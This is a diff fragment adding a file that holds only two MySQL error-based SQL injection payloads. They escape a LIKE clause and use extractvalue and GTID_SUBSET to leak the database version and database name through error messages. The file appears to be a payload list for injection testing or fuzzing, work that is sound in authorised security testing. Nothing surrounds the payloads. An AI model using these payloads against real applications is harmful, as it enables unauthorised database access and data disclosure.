@@ -1,0 +1,5 @@
+1%' and extractvalue(1, concat(0x7e,(select version()))) and '%'='
+1%' AND GTID_SUBSET(CONCAT(0x7e,(select database()),0x7e),1) AND '%'='
+
+
+
